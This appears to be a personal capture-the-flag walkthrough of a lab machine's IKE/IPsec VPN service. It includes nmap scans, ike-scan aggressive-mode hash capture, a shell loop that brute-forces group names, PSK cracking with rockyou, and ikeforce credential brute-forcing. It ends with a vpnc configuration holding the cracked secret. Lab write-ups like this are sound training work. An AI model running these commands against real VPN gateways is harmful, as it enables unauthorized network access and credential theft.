---
tags:
banner:
publish: false
---
```
nmap -p- -sV -sC 10.129.1.232
```

UDP scan too!!!
```
nmap -sU -T4 10.129.1.232
```
# Box info
ports:
- 22/tcp: ssh - OpenSSH 10.0p2 Debian 8

- 68/udp: dhcpc
- 69/udp: tftp
- 500/udp: isakmp
	- ike-version:
		- Attributes:
			- XAUTH
			- Dead Peer Detection v1.0
- 2002/udp: globe
- 4500/udp: nat-t-ike


OS: Linux debian

# Port 500: IKE stuffs
port 500 seems interesting, considering it’s the only port realyl giving back some banner data.

## What is IKE
IKE seems to be an [Internet Key Exchange](https://sase.checkpoint.com/blog/network/internet-key-exchange), whith isakmp being its predecessor. 

IKE is used to secure internet communication. It’s used for things like VPNs, site-to-site communication, and mobile device security. It’s also used to secure connections of workers connecting remotely to a server.
IKE is part of the Ipsec (Internet Protocol Security) suite, which is an encryption layer on top of the IP protocol.

Some vulnerabilities of IKE are password guessing, man in the middle downgrade attack, replay attacks and key reusing.

the default IKE port is 500/udp

The fact IKE is present on this machine probably means it’s a vpn server.

## Abusing IKE

### Initial info
Running [ike-scan](https://www.kali.org/tools/ike-scan/) to get more info out of the service.

```
Main Mode Handshare returned:
HDR=(CKY-R=b388e59b7d081dc8)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Authh=PSK LifeType=Seconds LifeDuration=28800)
VID=09002689dfdb712 (XAUTH)
VID=afcad71368a1f1c96b896fv77570110 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.028 seconds.
1 returned handshake; 0 returned notify
```

Following [this informative guide](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting), it seems that `1 returned handshake; 0 returned notify` means that the target is configured for IKE negotiations and we can propose *transforms* to the server. Transforms are configurations like the one sent in the code block.

All possible transforms:
![[Vault-data/Attachments/9 Expressway - Easy box-1.png]]

### Getting vendor
```bash
ike-scan -M --showbackoff 10.129.1.232
```
Running this will give us back the machine vendor by analysing the time between received messages.

The implementation guess is: Linksys Etherafast
![[Vault-data/Attachments/9 Expressway - Easy box.png]]
looking sharp

### Stealing the handshake key
Intercepting the hash by running agressive(`-A`) mode and cracking the pre-shared key output (`-P`).
```
ike-scan -P -M -A -n fakeID 10.129.1.232
```

In this case, a fake id was specified(`-n`) and there was still a hash given back, which means fake hashes are sent with fake ID’s (something modern versions do). Brute-forcing the ID and hash aren’t possible in this case.

### Bruteforcing the group name
Using [this list](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) to bruteforce the group name using common group names.

``` bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Misc/ike-groupid.txt
```

Running this yielded a number of IDS that seemed to work:
- GroupVPN
- Group-VPN
- EZ
- ez
- 3000
- ASA_vpn
- ASA_VPN
- PIX_VPN
- VPN_asa
- data
- dataflux
- DefaultL2Lgroup
- DefaultRAGroup
- DefaultWEBVPNGroup
- Ezvpn
- EZVPN
…a long list, you get it. To verify i will use another package.

Setting up a whole python 2 environment so i can run [ikeforce](https://github.com/SpiderLabs/ikeforce). 
Don’t forget to install a specific version of `pyopenssl`: ``pip install 'pyopenssl==17.2.0'``

Needs to be ran with `sudo`, otherwise it wont work
```bash
sudo -E env PATH=$PATH python ./ikeforce.py 10.129.1.232 -a -s 1
```
Outputs transform: 5 2 1 2

```bash
sudo -E env PATH=$PATH python ./ikeforce.py 10.129.238.52 -e -w ./wordlists/groupnames.dic -t 5 2 1 2
```

`no matching enumeration technique available for this device`…oof…i guess the long list will do

### Stealing the handshake key pt. 2

```bash
ike-scan -M -A -n GroupVPN --pskcrack=hash.txt 10.129.1.232
```

It also says an id is ID_USER_FQDN and ike@expressway.htb

```
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

Outputted pre shared key: freakingrockstarontheroad

Seems legit.

### Stealing XAuth login creds
```
sudo -E env PATH=$PATH python ./ikeforce.py 10.129.238.52 -a -u admin -w /usr/share/wordlists/rockyou.txt -t 5 2 1 2 --id=ike@expressway.htb
```

## Loggin into the vpn

as root:
```bash
cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway 10.129.238.52
IPSec ID ike@expressway.htb
IPSec secret freakingrockstarontheroad
IKE Authmode psk
STOP
```

and start the vpn…
```bash
sudo vpnc samplevpn
ifconfig ton0
```
